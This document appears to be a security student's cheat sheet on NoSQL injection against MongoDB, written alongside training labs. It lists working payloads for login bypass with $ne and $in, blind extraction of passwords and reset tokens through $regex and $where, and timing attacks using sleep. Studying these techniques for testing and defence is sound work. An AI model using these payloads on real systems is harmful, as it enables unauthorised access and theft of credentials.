# NoSQL Injection

### Enables an attacker to:&#x20;

* Bypass authentication or protection mechanisms.&#x20;
* Extract or edit data.&#x20;
* Cause a denial of service.&#x20;
* Execute code on the server.&#x20;

### NoSQL Database Models&#x20;

* Document stores - use formats such as JSON, BSON, and XML, and are queried in an API or query language (MongoDB, Couchbase)
* Key-value stores - store data in a key-value format (Redis, DynamoDB)&#x20;
* Wide-column stores - organize data into flexible column families (Apache Casandra, Apache HBase)
* Graph databases - use nodes to store data entities, and edges to store relationships between entities (Neo4j, Neptune)

### Types of NoSQL Injection

* Syntax Injection - occurs when you can break the NoSQL query syntax, enabling you to inject your own payload
* Operator Injection - occurs when you can use NoSQL query operators to manipulate queries

### Detecting Syntax Injection <sub>(basic rule fuzz the parameters using in-built keywords)</sub>

* **MongoDB**&#x20;
  * Via URL - ``'"`{ ;$Foo} $Foo \xYZ (URL encode)``&#x20;
  * Via JSON - ``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000``
* **Determining which characters are processed**&#x20;
  * Sample fuzz characters: `'`, `\'` (no error-may be vulnerable)
* **Confirming conditional behavior**&#x20;
  * Syntax- `' && 0 && 'x`, `' && 1 && 'x`
* **Overriding existing conditions**&#x20;
  * JavaScript payload- `'||1||'`&#x20;
  * Null payload- `'%00`, `'\u0000`
* Lab- Try fuzzing the parameter and construct a payload accordingly&#x20;

### NoSQL Operator Injection

* `$where` - Matches documents that satisfy a JavaScript expression.&#x20;
* `$ne` - Matches all values that are not equal to a specified value.&#x20;
* `$in` - Matches all of the values specified in an array.&#x20;
* `$regex` - Selects documents where values match a specified regular expression.&#x20;
* **Submitting Query Parameters**&#x20;
  * Insert query operators as nested objects&#x20;
  * JSON: `{"username":{"ne":"invalid"}}`&#x20;
  * URL: `username[$ne]=invalid`&#x20;
  * Try converting the request and exploit
* **Detecting operator injection in MongoDB**&#x20;
  * `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
  * `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`&#x20;
* Lab- use the regex operator to guess the first few letters of username and password to `$ne:""` (`"$regex":"admin.*`_)_

### Exploiting Syntax Injection to Extract Data

* Query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function.
* Payload: `' && this.password[0] == 'a' || 'a'=='b, ' && this.password.match(/\d/) || 'a'=='b`&#x20;
* Identifying field names&#x20;
  * Payload: `' && this.username!=' , ' && this.foo!='`&#x20;
  * Perform dictionary attack to identify the field/column names or use the combination length and index matching to get the field names
* Lab- Try multiple payload to generate false/&#x74;_&#x72;ue conditions._
* `' && 'a'=='b ,' && this.password.length < 10 ||'a'=='b, ' && this.password[0]=='a' ||'a'=='b)`

### Exploiting NoSQL Operator Injection to Extract Data

* **Injecting operators in MongoDB**&#x20;
  * Appending `"$where":"0" or "$where":"1"` might generate different responses depicting the DB evaluating JS expression.
* **Extracting field names**&#x20;
  * If you have injected an operator that enables you to run JavaScript, you may be able to use the keys() method to extract the name of data fields.&#x20;
  * eg: `"$where":"Object.keys(this)[0].match('^.{0}a.')"`
* **Exfiltrating data using operators**&#x20;
  * `$regex` operator to extract data character by character if JS is not evaluated.&#x20;
  * eg: `"password":{"$regex":"^a*"}`  (check whether the password begins with 'a')
* Lab- Try fetching the reset token field name using `keys()` and then find the token value using `match()`. Use the token and field name in forgot password page by including the field name & token as parameter & value in URL. `{"$where":"Object.keys(this)[0].match('^.{§§}§§.')"}` - keep incrementing the 1st payload to index the value and 2nd value to match the character, `"$where":"this.pwResetTkn.match('^.{§§}§§.')"}`&#x20;

### Timing Based Injection

* Load the page several times to determine a baseline loading time.
* Insert a timing based payload into the input. eg: `{"$where": "sleep(5000)"}`&#x20;
* Payloads: `'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+', '+function(x {if(x.password[0]==="a"){sleep(5000)};}(this)+'`
